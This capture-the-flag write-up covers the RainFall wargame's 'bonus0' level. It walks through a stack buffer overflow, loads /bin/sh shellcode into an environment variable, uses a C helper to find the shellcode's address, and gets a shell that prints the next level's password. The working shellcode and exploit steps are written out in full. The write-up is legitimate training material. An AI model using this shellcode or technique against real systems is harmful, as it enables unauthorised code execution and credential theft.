# Bonus 0

The program reads the stdin two times then concatenates them and prints the result

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
Lee
 - 
Sang-Hyeok
Lee Sang-Hyeok
```

By imputing a lot of characters, we have a segfault

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��� aaaaaaaaaaaaaaaaaaaa���
Segmentation fault (core dumped)
bonus0@RainFall:~$ dmesg
[...]
[33664.608283] bonus0[2087]: segfault at 61616161 ip 61616161 sp bffff660 error 14
```

After successfully imputing a shellcode and running it with the help of a script, we go through this error:

```dmesg
[26277.356375] bonus0[14459] general protection ip:bffff65e sp:bffff66c error:0
```

Which suggest that there are some kind of protections. Fortunately we can pass the shellcode through the environnement!

```bash
export SHELLCODE=$(python -c 'print("\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
```

To retrieve the address of the shellcode, we can use a little C program:

```c
int main() {
	printf("%p\n", getenv("SHELLCODE"));
}
```

```bash
bonus0@RainFall:/tmp$ gcc /home/user/bonus0/main.c
/home/user/bonus0/main.c: In function ‘main’:
/home/user/bonus0/main.c:2:2: warning: incompatible implicit declaration of built-in function ‘printf’ [enabled by default]
/home/user/bonus0/main.c:2:2: warning: format ‘%p’ expects argument of type ‘void *’, but argument 2 has type ‘int’ [-Wformat]
bonus0@RainFall:/tmp$ ./a.out 
0xbffff889
```

We don't really care about warnings here, so we'll just take our address: `0xbffff889` and put it into our script.

Now lets try our script again:

```bash
bonus0@RainFall:~$ python bonus0.py | ./bonus0 
 - 
 - 
aaaaaaaaaaaaaaaaaaaa01234������������bbb��� 01234������������bbb���
whoami
bonus1
cd ../bonus1
cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
````